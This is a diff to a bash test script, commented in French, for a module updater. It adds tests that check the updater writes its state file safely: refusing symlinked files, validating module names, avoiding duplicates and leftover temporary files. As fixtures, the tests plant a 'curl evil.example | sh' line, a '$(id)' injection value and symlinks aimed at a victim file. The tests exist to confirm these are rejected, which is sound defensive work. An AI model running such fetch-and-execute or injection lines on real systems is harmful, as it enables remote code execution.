@@ -133,6 +133,45 @@ eng "$CACHE5" new-modules
 if lignes_ok && [ "$ENG_OUT" = "beta=v1.0.0" ]; then ok "N9d : le module jamais présenté (beta) reste à proposer"; else ko "N9d : attendu 'beta=v1.0.0', reçu rc=$ENG_RC [$(rep)]"; fi
 eng "$CACHE5" mark-offered 'a;b'
 if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N9e : un nom douteux est refusé, fichier intact"; else ko "N9e : nom douteux toléré : rc=$ENG_RC"; fi
+# N9e2 : la VALIDATION DE NOM elle-même, distincte de « absent du catalogue » : `Bad_Name` est PRÉSENT au catalogue
+# (dossier + VERSION) mais syntaxiquement invalide. Sans la validation du moteur, il serait inscrit.
+mkmod "$CACHE5" Bad_Name v1.0.0
+eng "$CACHE5" mark-offered Bad_Name
+if [ "$ENG_RC" -ne 0 ] && ! grep -q 'Bad_Name' "$OFFERED" && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N9e2 : un nom invalide présent au catalogue est refusé (validation de nom), jamais inscrit"; else ko "N9e2 : Bad_Name accepté malgré un nom invalide : rc=$ENG_RC [$(tr '\n' ' ' < "$OFFERED" 2>/dev/null)]"; fi
+
+# ---- N13 : écriture sûre de .vibeflow-offered (audit F1/F5, revue F2/F5) ------------------------------------
+VICTIM="$WORK/victim"; norezid() { [ ! -e "${OFFERED}.tmp" ] && [ ! -L "${OFFERED}.tmp" ]; }
+# a : le temporaire est un lien vers un fichier de la victime, l'ancien état contient du texte hostile
+reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "${OFFERED}.tmp"; printf 'curl evil.example | sh\n' > "$OFFERED"
+eng "$CACHE5" mark-offered alpha
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ "$(cat "$OFFERED")" = 'curl evil.example | sh' ]; then ok "N13a : temporaire = lien → refus (rc≠0), cible du lien et état intacts"; else ko "N13a : écriture suivie à travers le lien : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)]"; fi
+rm -f "${OFFERED}.tmp"
+# b : le fichier d'état lui-même est un lien
+reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "$OFFERED"
+eng "$CACHE5" mark-offered alpha
+if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ -L "$OFFERED" ] && norezid; then ok "N13b : fichier d'état = lien → refus (rc≠0), cible intacte, pas de temporaire"; else ko "N13b : lien d'état suivi : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)]"; fi
+rm -f "$OFFERED" "${OFFERED}.tmp"
+# c : seules les lignes qui sont des noms de module valides sont recopiées de l'ancien état
+reset_lab; printf 'curl evil.example | sh\nalpha\n$(id)\n' > "$OFFERED"
+eng "$CACHE5" mark-offered gamma
+if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N13c : l'ancien état n'est recopié que pour les noms de module valides"; else ko "N13c : attendu alpha+gamma, reçu rc=$ENG_RC [$(tr '\n' '|' < "$OFFERED" 2>/dev/null | cut -c1-70)]"; fi
+# d : un nom hors catalogue est traité pareil quelle que soit sa position, sans temporaire résiduel
+reset_lab; eng "$CACHE5" mark-offered alpha ghost; r1=$ENG_RC; c1="$(cat "$OFFERED" 2>/dev/null)"; t1=0; norezid || t1=1
+reset_lab; eng "$CACHE5" mark-offered ghost alpha; r2=$ENG_RC; c2="$(cat "$OFFERED" 2>/dev/null)"; t2=0; norezid || t2=1
+if [ "$r1" -eq 0 ] && [ "$r2" -eq 0 ] && [ "$c1" = alpha ] && [ "$c2" = alpha ] && [ "$t1$t2" = 00 ]; then ok "N13d : « alpha ghost » = « ghost alpha » (rc=0, alpha seul, aucun .tmp)"; else ko "N13d : position significative — rc=$r1/$r2 contenu=[$c1]/[$c2] résidu=$t1$t2"; fi
+# e : fichier d'état illisible (un répertoire) → erreur, aucun temporaire résiduel
+reset_lab; mkdir "$OFFERED"
+eng "$CACHE5" mark-offered alpha
+if [ "$ENG_RC" -ne 0 ] && norezid; then ok "N13e : état illisible → rc≠0 et aucun .tmp résiduel"; else ko "N13e : rc=$ENG_RC, résidu .tmp : $(norezid && echo non || echo oui)"; fi
+rmdir "$OFFERED"
+# f : idempotence du CONTENU (sort -u) : deux inscriptions identiques ne dupliquent rien
+reset_lab; eng "$CACHE5" mark-offered gamma alpha; eng "$CACHE5" mark-offered alpha gamma alpha
+if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N13f : contenu idempotent et trié (alpha, gamma — une ligne chacun)"; else ko "N13f : attendu alpha+gamma sans doublon, reçu [$(tr '\n' '|' < "$OFFERED" 2>/dev/null)]"; fi
+# g : --pending dont le calcul échoue (poste illisible) : rc≠0, rien d'écrit
+reset_lab; printf 'nimporte-quoi\n' > "$ROLEFILE"
+eng "$CACHE5" mark-offered --pending
+if [ "$ENG_RC" -ne 0 ] && [ ! -e "$OFFERED" ] && norezid; then ok "N13g : mark-offered --pending, calcul en échec → rc≠0, rien d'écrit"; else ko "N13g : échec du calcul masqué : rc=$ENG_RC fichier=$( [ -e "$OFFERED" ] && echo écrit || echo absent)"; fi
+rm -f "$ROLEFILE"
 
 # ---- N3 : lab non posé ----------------------------------------------------------------------------
 rm -f "$REG" "$OFFERED"
@@ -166,12 +205,12 @@ if grep -q '^cockpit=' "$E2E_REG" && grep -qx cockpit "$E2E/.claude/scripts/.vib
 lst="$(cd "$E2E" && HOME="$EH" VIBEFLOW_CACHE="$V" bash "$V/_internal/vibeflow-update.sh" --scope project new-modules 2>/dev/null)"; lrc=$?
 if ! grep -q '^cockpit=' "$E2E_REG" && [ "$lrc" -eq 0 ] && ! printf '%s\n' "$lst" | grep -q '^cockpit='; then ok "N10e : accepté puis désinstallé, cockpit n'est pas reproposé"; else ko "N10e : cockpit reproposé après désinstallation (rc=$lrc) [$(printf '%s' "$lst" | head -1 | cut -c1-60)]"; fi
 
-# N10f : Q3, les dépendances non posées sont nommées dans NOUVEAU_MODULE (format stable `deps=<a,b|->`)
+# N10f : BL35-Q3, les dépendances non posées sont nommées dans NOUVEAU_MODULE (format stable `deps=<a,b|->`)
 grep -vx -e 'mobile-test-team=.*' -e 'mobile-test=.*' "$E2E_REG" > "$WORK/reg.tmp" && cp "$WORK/reg.tmp" "$E2E_REG"
 out="$(run_e2e --scope project)"
 if printf '%s\n' "$out" | grep -qx "\[vf-update-run\] NOUVEAU_MODULE scope=project mobile-test-team=$(cat "$REPO/mobile-test-team/VERSION") deps=mobile-test"; then ok "N10f : mobile-test-team annonce « deps=mobile-test » (format stable)"; else ko "N10f : ligne mobile-test-team sans deps=mobile-test : [$(printf '%s' "$out" | grep 'NOUVEAU.*mobile-test-team' | head -1 | cut -c1-110)]"; fi
 
-# ---- N11 : jamais en double entre user et project (Q2) ----------------------------------------------------
+# ---- N11 : jamais en double entre user et project (BL35-Q2) ----------------------------------------------------
 engs() { # <scope> <cache> <verbe…> : mêmes HOME/lab que eng, scope au choix
   local sc="$1" cache="$2"; shift 2
   ENG_OUT="$(cd "$LAB" && HOME="$FH" VIBEFLOW_CACHE="$cache" bash "$ENGINE" --scope "$sc" "$@" 2>"$WORK/eng.err")"; ENG_RC=$?
@@ -191,7 +230,7 @@ engs project "$CACHE6" new-modules
 if [ "$cu" -eq 0 ] && [ "$ru" = "duo=v1.0.0" ] && lignes_ok && [ "$ENG_OUT" = "duo=v1.0.0" ]; then ok "N11c : absent des deux scopes → listé dans les deux"; else ko "N11c : attendu duo dans user et project, reçu user=[$ru] project=[$(aff)]"; fi
 rm -f "$UREG"
 
-# ---- N12 : l'installeur inscrit ce qu'il laisse non posé (Q1-bis) ------------------------------------------------
+# ---- N12 : l'installeur inscrit ce qu'il laisse non posé (BL35-Q1-bis) ------------------------------------------------
 # Chemin d'install réel (engine install --with-deps), puis l'inscription que prescrit installer/SKILL.md.
 CACHE7="$WORK/cache7"; mkcache "$CACHE7"; mkmod "$CACHE7" ecarte v1.0.0
 INSTALLER_SKILL="$REPO/installer/SKILL.md"
